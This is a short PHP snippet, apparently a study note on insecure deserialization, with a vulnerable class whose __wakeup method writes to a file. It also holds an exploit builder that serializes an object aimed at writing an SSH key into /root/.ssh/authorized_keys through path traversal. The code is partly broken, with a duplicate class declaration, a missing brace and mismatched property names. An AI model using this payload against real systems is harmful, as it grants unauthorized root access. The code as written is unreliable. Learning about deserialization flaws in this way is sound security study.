

<?php
//----------------------VUlnerable code ------------------
class playBuff
{
    public $logFIle="/var/log/default.log";
    public $logData="Updated";

    public function __wakeup() //__wakeup is one of the magic method  that allows us to do badness
    {
        //. concatenates in php
        file_put_contents(__DIR__. "/" . $this->logfile, $this->logData); //so in current working dir put / then inside /var/log/default.log put content Updated
        //__DIR__ is current working directoy 
    }

}



 class playBuff                                                                                                                                                                                                 
  {                                                                                                                                                                                                              
      public $logFIle="/var/log/default.log";                                                                                                                                                                    
      public $logData="Updated";  

        public function __construct()
        {
            $this->logfile="../../../../../../../root/.ssh/authorized_keys";
            $this->logData="-----------your ssh key -------------------";
        }
$obj= new playBuff();
echo serialize($obj);

?>
